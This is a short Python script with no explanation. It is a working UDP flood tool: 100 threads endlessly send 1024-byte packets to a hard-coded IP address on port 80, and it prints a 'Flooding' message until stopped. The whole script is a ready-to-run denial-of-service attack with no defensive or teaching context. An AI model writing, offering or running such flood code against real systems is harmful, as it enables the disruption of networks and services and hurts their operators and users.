import socket
import threading

TARGET_IP = "10.0.0.187"
TARGET_PORT = 80
PAYLOAD = b"X" * 1024

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(PAYLOAD, (TARGET_IP, TARGET_PORT))

threads = []
for i in range(100):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    threads.append(t)

print(f"Flooding {TARGET_IP}...")
input("Press Enter to stop...")